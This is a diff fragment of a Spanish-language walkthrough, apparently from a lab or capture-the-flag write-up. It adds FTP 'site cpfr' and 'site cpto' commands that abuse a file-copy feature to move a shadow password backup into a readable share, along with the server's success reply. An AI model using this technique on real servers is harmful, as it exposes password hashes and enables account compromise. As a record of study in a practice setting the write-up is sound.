@@ -361,6 +361,11 @@ básicamente esta vulnerabilidad nos indica que podemos hacer `site cpfr /etc/pa
 realizamos la copia efectiva del archivo al directorio donde tenemos permisos de lectura
 
 ```python
+site cpfr /var/backups/shadow.bak
 
+site cpto /home/aeolus/share/shadow.bak
+
+250 Copy successful
 ```
+
 ![[Pasted image 20240618215019.png]]
